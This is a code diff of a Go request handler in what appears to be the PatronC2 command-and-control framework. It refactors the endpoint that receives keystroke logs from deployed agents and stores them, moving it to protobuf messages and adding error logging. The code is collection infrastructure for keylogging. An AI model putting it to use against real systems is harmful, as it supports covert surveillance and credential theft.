@@ -1,28 +1,35 @@
 package handlers
 
 import (
-	"net"
-
+	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/data"
+	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/Patron/types"
 )
 
-// Fetches the keylogs from an agent and returns the status to the client
-
 type KeysHandler struct{}
 
-func (h *KeysHandler) Handle(request types.Request, conn net.Conn) types.Response {
-    c, ok := request.Payload.(types.KeysRequest)
-    if !ok {
-        return types.Response{
-            Type:    types.KeysResponseType,
-            Payload: types.KeysResponse{},
-        }
-    }
-	data.UpdateAgentKeys(c.AgentID, c.Keys)
-	// This type doesn't actually matter since the client won't read it
-	return types.Response{
-		Type:    types.KeysResponseType,
-		Payload: types.KeysResponse{},
+func (h *KeysHandler) Handle(request *patronobuf.Request, stream types.CommonStream) *patronobuf.Response {
+	keyReq := request.GetKeys()
+	if keyReq == nil {
+		return &patronobuf.Response{
+			Type: patronobuf.ResponseType_KEYS_RESPONSE,
+			Payload: &patronobuf.Response_KeysResponse{
+				KeysResponse: &patronobuf.KeysResponse{},
+			},
+		}
+	}
+
+	err := data.UpdateAgentKeys(keyReq)
+	if err != nil {
+		logger.Logf(logger.Error, "Failed to update keys: %v", err)
+	}
+
+	// Client does not read this response currently
+	return &patronobuf.Response{
+		Type: patronobuf.ResponseType_KEYS_RESPONSE,
+		Payload: &patronobuf.Response_KeysResponse{
+			KeysResponse: &patronobuf.KeysResponse{},
+		},
 	}
 }
